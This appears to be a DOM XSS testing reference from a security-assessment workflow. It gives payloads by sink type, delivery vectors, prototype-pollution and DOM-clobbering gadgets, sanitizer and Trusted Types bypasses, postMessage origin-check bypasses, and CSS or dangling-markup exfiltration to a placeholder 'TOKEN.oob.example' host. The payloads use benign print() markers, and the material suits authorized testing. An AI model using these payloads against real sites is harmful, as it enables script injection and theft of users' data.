# DOM XSS payloads by sink + delivery (steps 4–5)
# Classify the SINK (from taint_flows.json), pick a payload, deliver it via the SOURCE.
# Record attempts in payloads_tried.jsonl: {id, source, sink, delivery, payload, reached, executed}.
# Benign confirmation only (print()/window.__rs). Hash delivery sends nothing to the server.

## Delivery vectors (by source)
```
hash:        https://target/page#PAYLOAD
search:      https://target/page?q=PAYLOAD           # client-read param (not server-reflected)
window.name: attacker page sets window.name=PAYLOAD then navigates to target
referrer:    victim arrives at target FROM attacker page carrying PAYLOAD in the URL
postMessage: attacker page -> target iframe:  frame.postMessage(PAYLOAD, '*')
```

## Payload by sink type
### HTML sinks (`innerHTML`, `document.write`, `$().html`, `insertAdjacentHTML`)
```
<img src=x onerror=print()>
<svg onload=print()>
```
Note: `<script>` injected via `innerHTML` does NOT execute — use `img`/`svg`/event handlers.

### Code-exec sinks (`eval`, `Function`, `setTimeout(string)`)
```
print()
;window.__rs=1//
```

### Navigation sinks (`location`, `a.href`, `location.href=`)
```
javascript:print()
javascript:print()//
```

### jQuery `$(source)`
```
#<img src=x onerror=print()>          # $(location.hash) on older jQuery
```

### postMessage handler → sink
```
# attacker page:
target.contentWindow.postMessage('<img src=x onerror=print()>', '*')
```

## Prototype pollution → gadget
```
https://target/page?__proto__[src]=data:,print()           # then a gadget uses polluted .src
https://target/page?__proto__[innerHTML]=<img src=x onerror=print()>
```
Confirm the pollution (`Object.prototype.src` set) AND the gadget firing — report the chain.

## Trusted Types / CSP
If `require-trusted-types-for 'script'` is set, string→sink is blocked. Look for an existing
**default policy** or an allowed policy that passes your input, or a DOMPurify-as-TT config with a
bypass. If none, the flow is non-executing under TT → downgrade (verify.md).

Escalate complexity only when a simple vector is proven filtered. Confirm EXECUTION via the browser
(devtools trace), not mere reflection into the DOM.

---

## Extended arsenal — source→sink payload matrix
Benign markers only (`print()` / `window.__rs=1`). Deliver via the SOURCE; the payload fires at the SINK.
### HTML-write sinks (`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `$.html/append/…`, `Range.createContextualFragment`, `DOMParser.parseFromString(_,'text/html')`)
```
<img src=x onerror=print()>
<svg onload=print()>
<svg><animate onbegin=print() attributeName=x dur=1s>
<iframe srcdoc="<svg onload=print()>">
# raw <script> set via innerHTML does NOT run — use img/svg/handlers
# delivery:
#<img src=x onerror=print()>            # location.hash → el.innerHTML
?q=<img src=x onerror=print()>          # client-read param → innerHTML
```
### Code-exec sinks (`eval`, `Function`, `setTimeout/Interval('…')`, `setAttribute('on*',…)`, `execScript`)
```
print()
;print()//
})(print())//                           # close a wrapper the sink builds
print();var _=(                          # for eval('f('+src+')')
```
### Navigation / scheme sinks (`location`, `location.href/assign/replace`, `a.href`, `iframe.src`, `window.open`, `form.action`)
```
javascript:print()
javascript:void(print())//
#javascript:print()                      # when code does: location = location.hash.slice(1)
```
### Attribute sinks (`setAttribute`, `el.src/href/srcdoc/formaction`, `el.style`)
```
setAttribute('href','javascript:print()')
iframe.srcdoc = '<svg onload=print()>'
```
### jQuery-specific (version-sensitive — confirm via retire.js)
```
$(location.hash)                         # #<img src=x onerror=print()>  (selector→HTML, esp. <3.5)
$('#'+location.hash.slice(1))
$.parseHTML(userInput)                   # <img src=x onerror=print()>
$('<div>').html(userInput)
$(userInput).appendTo('body')
```
`<1.9` ran scripts from `.html()`; `1.12`/`2.x`/`<3.5` have selector→HTML quirks.

## Extended arsenal — postMessage exploitation (source: `event.data`)
Attacker page drives a handler that trusts `event.data` and skips/mis-checks `event.origin`:
```html
<iframe src="https://HOST/page" id=f></iframe>
<script>
f.onload = () => f.contentWindow.postMessage('<img src=x onerror=print()>', '*');
// structured variant:
f.onload = () => f.contentWindow.postMessage({html:'<img src=x onerror=print()>'}, '*');
</script>
```
Weak origin checks that still fire (attacker at `HOST.evil.com` / `attacker-HOST.com`):
```
origin.indexOf('HOST') > -1
origin.startsWith('https://HOST')
/HOST/.test(origin)                      # unanchored regex
```
Benign proof: the target runs `print()` / sets `window.__rs=1` from the posted value.

## Extended arsenal — client-side template injection (DOM-evaluated)
Confirm `{{7*7}}`→`49` first.
### AngularJS (expression sandbox by version; sandbox removed in 1.6)
```
{{constructor.constructor('print()')()}}                     # 1.0.x / 1.6+
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'print()')()}}   # 1.2.19–1.2.23
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,print(),a')}}    # 1.3.0
{{'a'.constructor.prototype.charAt=[].join;$eval('x=print()')}}               # 1.4.0–1.5.8
```
Delivered via a source bound into the template (hash/search). Pin the exact minor version first.
### Vue
```
{{constructor.constructor('print()')()}}     # Vue 2
{{_c.constructor('print()')()}}              # Vue 2
{{_openBlock.constructor('print()')()}}      # Vue 3
# v-html="src" with tainted src → <img src=x onerror=print()>
```

## Extended arsenal — prototype-pollution → DOM-XSS gadget chains
Pollute a property a later sink reads off a plain object (confirm on a FRESH object, then the gadget firing):
```
?__proto__[src]=data:,print()                       # gadget: cfg.src || default → script.src
?__proto__[innerHTML]=<img src=x onerror=print()>   # gadget: el.innerHTML = cfg.innerHTML
?__proto__[onerror]=print()                         # gadget sets el.onerror from cfg
#__proto__[src]=data:,print()                        # via a hash sink
{"__proto__":{"template":"<img src=x onerror=print()>"}}   # JSON merge → template gadget
constructor[prototype][src]=data:,print()            # when __proto__ is filtered
```
Common sink-bearing merges: `$.extend(true,…)`, lodash `merge/set/defaultsDeep`, config/sanitizer loaders.
Report the full chain: pollution proof + gadget execution.

## Extended arsenal — DOM clobbering (markup-only → variable control)
When only tags/attributes pass, clobber a named reference a script reads:
```html
<a id=x href="javascript:print()"></a>              # code: location = window.x / x.href
<form id=cfg><input name=url value="javascript:print()"></form>   # cfg.url
<img name=currentScript>                             # clobber document.currentScript reads
<a id=y></a><a id=y name=z href=...>                 # y.z nested (HTMLCollection) clobber
```
Benign proof: clobber a value the page feeds to `location`/`.src`/`innerHTML`, aim it at `print()` or a
`TOKEN.oob.example` marker.

## Extended arsenal — Trusted Types bypass patterns
If `require-trusted-types-for 'script'` is enforced, string→sink throws. Look for:
```
# an existing default policy whose createHTML returns input verbatim → inject normally
# a named policy with a weak createHTML/createScriptURL reachable with your input
# DOMPurify-as-a-TT-policy with a bypassable config (allow svg/mathml, ALLOW_UNKNOWN_PROTOCOLS, …)
# navigation/scheme sinks NOT covered by TT → javascript: still works
# a 'trusted-types *' or report-only policy → not enforced; treat as no-TT
```
If none and TT is enforced: flow is non-executing under TT → downgrade (verify.md), note the missing control.

## Extended arsenal — additional sources & delivery
```
history.state / pushState data → sink
localStorage/sessionStorage set by an earlier flow → sink (chain)
document.cookie read into a sink (needs a cookie-set vector)
WebSocket / EventSource / BroadcastChannel message → innerHTML
document.referrer → sink (link from an attacker page carrying the payload in its URL)
window.name → sink (set on the attacker page, then navigate to HOST)
```

---

## Extended arsenal — DOM clobbering (advanced gadgets, markup-only)
When injection is markup-only (no `<script>`, no `on*`), clobber a named reference the page later
feeds to a sink. Named elements expose themselves as `window.<id>` / `document.<name>`; duplicate ids
build an `HTMLCollection` whose `name`d members are addressable; anchors coerce to their `href` string.
```html
# 3-level x.y.z — form id → named child form → named input (string value out)
<form id=cfg name=api><input id=endpoint value="javascript:print()"></form><form id=cfg></form>
# gadget: location = cfg.api.endpoint.value  /  s.src = cfg.api.endpoint

# named HTMLCollection member → anchor href as a script URL
<a id=loaderCfg></a>
<a id=loaderCfg name=enabled></a>
<a id=loaderCfg name=scriptUrl href="//TOKEN.oob.example/x.js"></a>
# gadget: s.src = window.loaderCfg.scriptUrl   (coerces to the href)

# window.<obj> || {} defaulting gadget — supply the "missing" global
<a id=someObject href="//TOKEN.oob.example/x.js"></a>
# gadget: (window.someObject||{}).url ... s.src = that

# deeper nesting via iframe srcdoc (needs a paint delay, e.g. a <style>@import to stall)
<iframe name=cfg srcdoc="<a id=api href=javascript:print()></a>"></iframe>

# DOMPurify-surviving cid: quote smuggle — cid: is allowed and keeps a raw &quot;
<a id=defaultAvatar></a><a id=defaultAvatar name=avatar href="cid:&quot;onerror=print()//">
```
Filter/property-check bypass by clobbering the property a guard reads (not the sink itself):
```html
<form id=y><input name=nodeName></form>          # y.nodeName → an element, not "FORM"
<form id=y><input name=attributes></form>        # shadow .attributes a sanitizer iterates
# also targetable: tagName, parentNode, children; document.cookie / document.getElementById
<img name=cookie>                                 # document.cookie becomes an element (breaks a string read)
<html id=cdnDomain class=x>                        # 2nd element same id can hijack getElementById/querySelector result
# cross-form field/submit injection via the form= attribute:
<button form=victimForm formaction="//TOKEN.oob.example/" formmethod=post>x</button>
```
Benign proof: the clobbered value lands in `location` / `.src` / `innerHTML` and fires `print()` or
hits `TOKEN.oob.example`. Report: which global/property was clobbered + the sink that consumed it.

---

## Extended arsenal — Shadow DOM / web-component sink surface
Shadow DOM is NOT a trust boundary for same-realm JS; relevance is new HTML-parsing sinks.
Declarative Shadow DOM (DSD) materializes from markup at parse time.
```html
# DSD via setHTMLUnsafe / ShadowRoot.setHTMLUnsafe (these DO parse DSD; plain innerHTML does NOT)
<div><template shadowrootmode=open><img src=x onerror=print()></template></div>
# slot gadget — leading text node becomes slotted content → slotchange fires
x<template shadowrootmode=open><slot onslotchange=print()>
```
```js
// live sinks that parse the template above:
el.setHTMLUnsafe(userHTML);  ShadowRoot.prototype.setHTMLUnsafe(userHTML);
// sanitizer footgun — returnDOM/returnDOMFragment keeps a live DSD subtree that re-arms on append:
target.appendChild(DOMPurify.sanitize(userHTML,{RETURN_DOM_FRAGMENT:true}));  // string return is safer
```
Enumerate closed roots by hooking `Element.prototype.attachShadow` before the component inits.
Classic `<script>` stays inert inside shadow trees — use `on*` / `javascript:` / slot gadgets.

---

## Extended arsenal — mutation XSS (mXSS) + namespace confusion
A sanitizer sees a SAFE tree; the browser RE-PARSES the serialized string into a DIFFERENT, unsafe tree
(HTML↔SVG/MathML foreign-content namespace switch breaks nesting assumptions). Confirm by diffing
`sanitize()` output vs the final live DOM.
```html
# SVG / <style> / <p> reparse confusion
<svg></p><style><a id="</style><img src=x onerror=print()>"></svg>
# MathML <mtext><mglyph> integration-point confusion
<math><mtext><table><mglyph><style><img src=x onerror=print()>
# <noscript>/<template> context flip, foreignObject HTML-in-SVG
<svg><foreignobject><img src=x onerror=print()></foreignobject></svg>
# text-join reparse (nodes safe apart, joined into live markup by a later get_text()/innerHTML)
<p><</p><p>img src=x onerror=print()</p><p>></p>
```
Proof: the reparsed node executes `print()` although the pre-serialization tree was inert.

---

## Extended arsenal — sanitizer (DOMPurify-class) bypass concept patterns
DOMPurify is a TARGET here. Bypasses are config- or order-dependent, not core-parser breaks:
```
# ORDER bug: sanitize the SOURCE, THEN a renderer (marked/markdown) re-emits HTML never inspected
DOMPurify.sanitize(md); html = marked(md);          # markdown re-creates <img onerror=print()>
# CONFIG opened the door:
ADD_TAGS/ADD_ATTR re-allow a dangerous element/handler
ALLOW_UNKNOWN_PROTOCOLS → javascript:/cid: survive
default svg+mathml allowed → namespace-confusion mXSS (above)
WHOLE_DOCUMENT / RETURN_DOM(_FRAGMENT) → live DOM keeps a DSD subtree
# MUTATION after sanitize: output stored, re-parsed in a new context later → mXSS
# base-element pass-through (if <base> survives) rebases relative script src:
<base href="//TOKEN.oob.example/">
```
Proof: a canary executes AFTER the sanitize step runs on the input. Note the exact config/order that let it through.

---

## Extended arsenal — script gadgets (bypass sanitizer AND Trusted Types)
The injected string is BENIGN markup; an in-page framework/loader READS it and calls the sink itself —
so sanitizer allow-lists and Trusted Types (the gadget is the trusted caller) are both sidestepped.
```html
<div data-loader="//TOKEN.oob.example/x.js"></div>     # a loader does s.src = el.dataset.loader
<div class=carousel data-slick='{"...":"<img src=x onerror=print()>"}'></div>  # plugin re-injects as HTML
<template id=app>{{constructor.constructor('print()')()}}</template>            # framework compiles template
<div data-bind="html: userVal"></div>                   # MVVM html binding → innerHTML
```
Hunt: markup-reading frameworks (`dataset`, `[data-*]`, `querySelector`-driven loaders, auto-init plugins).
Burp DOM Invader's gadget scan surfaces these. Report the gadget fn that reached the sink.

---

## Extended arsenal — postMessage advanced bypasses + SOME
Net-new to the basic postMessage block above. Handler reaches a sink after a weak/absent origin check:
```js
// "contains http:" guard on a value assigned to location.href → javascript: with trailing comment
f.contentWindow.postMessage('javascript:print()//http:','*');
// relay gadget in a trusted/compromised frame turns any message into exec:
'<img src onerror="onmessage=e=>eval(e.data.cmd)">'     // then post {cmd:'print()'}
// prototype-pollution via postMessage (two-step): poison a prop, then trigger a render
f.contentWindow.postMessage('{"__proto__":{"template":"<img src=x onerror=print()>"}}','*');
f.contentWindow.postMessage('refresh','*');            // see the prototype-pollution skill for gadgets
```
Origin-check bypasses that still pass a sink-bearing handler:
```
sandboxed iframe + allow-popups (no escape) → both origins are "null" → e.origin==window.origin passes
e.source forced null (post from an iframe deleted right after) → bypasses source===window checks
X-Frame-Options/frame-ancestors set → open in a new window (window.open) and post after a delay
.search()/.match() origin check → regex-meta ('.' is any char); subdomain/path-prefix relays
```
**SOME (Same-Origin Method Execution)** — a JSONP/callback endpoint emits `<script>opener.CALLBACK()</script>`
same-origin, so a `\w . _`-only callback can invoke an arbitrary DOM method on the opener's page:
```
callback = document.body.firstElementChild.firstElementChild.click   # click a sensitive control
callback = document.forms.0.submit                                     # submit a state-changing form
```
Chain: attacker page → opens itself (gets `opener`) → opener loads the sensitive page → popup hits the
callback endpoint → runs `opener.<method>`. Severed by COOP / `rel=noopener`. Treat full-JS callbacks as plain XSS.

---

## Extended arsenal — Markdown-renderer XSS
Source text → markdown→HTML sink. Confirm the renderer, then:
```markdown
[x](javascript:print())
[x](JaVaScRiPt:print())
[x](javascript://%0aprint())
[x](javascript:window.onerror=print;throw%201)
<javascript:print()>                         # autolink form
[ref]: (javascript:print())                   # reference-style
![x](<"onerror="print()>)                     # image-alt attribute break
<img src=x onerror=print()>                    # raw-HTML passthrough (if HTML not stripped)
<base href="//TOKEN.oob.example/">            # rebase relative script src (if <base> survives)
```
High-value: sanitize-then-render ORDER bugs (DOMPurify on source, then `marked`) — see sanitizer block.

---

## Extended arsenal — CSS injection → data exfil + dangling markup (scriptless)
No JS execution — leak DOM/attribute state via CSS network requests, or capture markup with a dangling tag.
Benign proof: exfil a KNOWN test canary (not a real secret) to an attributable `TOKEN.oob.example`.
```css
/* attribute-selector value exfil, char by char (one request per guessed prefix) */
input[name=canary][value^="a"]{background:url(//TOKEN.oob.example/leak?c=a)}
input[name=canary][value^="b"]{background:url(//TOKEN.oob.example/leak?c=b)}
/* hidden input (no background) — target a following sibling */
input[name=canary][value^="ab"] ~ *{background:url(//TOKEN.oob.example/leak?c=ab)}
/* @import chain: server returns the next probe set after each leaked char */
@import url(//TOKEN.oob.example/step?);
/* text-node exfil: a font is fetched only if its code point is rendered on the page */
@font-face{font-family:x;src:url(//TOKEN.oob.example/?A);unicode-range:U+0041}
#secret{font-family:x}
/* blind-page existence oracle */
html:has(input[name^=can]):not(input[name=canary]){background:url(//TOKEN.oob.example/hit)}
```
Dangling markup (when even CSS is filtered) — an unclosed tag swallows following markup to the attacker:
```html
<img src='//TOKEN.oob.example/log?html=          <!-- captures up to next quote -->
<meta http-equiv=refresh content='0;url=//TOKEN.oob.example/?d=   <!-- when img blocked -->
<style>@import//TOKEN.oob.example?                 <!-- captures up to next ; -->
<base href="//TOKEN.oob.example/">                 <!-- relative form/link/script rebase -->
<form action=//TOKEN.oob.example/><input name=x value="    <!-- hijack next form's data -->
```

---

## Extended arsenal — XS-Leaks / XS-Search oracles (benign measurement, not code-exec)
Adjacent client-side primitives that MEASURE cross-site state (no XSS execution — downgrade per verify.md).
Use only to demonstrate a leak with a benign probe.
| Oracle | Measures | DOM/API primitive |
|---|---|---|
| status-code | success vs error of a cross-origin load | `<img>/<script>/<object>` `onload`/`onerror` |
| frame-count | per-state embedded-frame count | `win.length` on a `window.open`/iframe handle |
| timing | request/work duration | `performance.now()`, long-task timing |
| cache-probe | is a resource already cached | `fetch()`+`AbortController`, `performance.getEntriesByName` |
| fragment+onblur | does `#id` element exist | iframe `src#id` → `focus`/`onblur` |
| element-leak | per-state media/image dims | `img.width/height`, `media.duration`, `getComputedStyle` |
| CSP-violation | cross-origin redirect/load state | `securitypolicyviolation` event / `report-uri` |
| COOP/opener | COOP present, popup state | `window.opener===undefined`, `message` events |

---

## Extended arsenal — template-literal injection + extra CSTI engines
Beyond the AngularJS/Vue block above. Confirm evaluation first (`{{7*7}}`→`49`, or `[7*7]` for Mavo).
```js
// client-side template-literal injection (input lands inside backticks)
`Hello ${print()}`
`${`${`${print()}`}`}`                        // nested, past naive ${ } filters
```
```
# Mavo (mv-/data-mv- attributes) — non-JS expression syntax slips token filters
[self.print()]  /  [(1,print)()]
[''=''or self.print()]
<a data-mv-if='1 or self.print()'>x</a>
<div data-mv-expressions="x x">xself.print()x</div>
```
Pin the engine/minor version, then pick the matching escape; deliver via a source bound into the template.
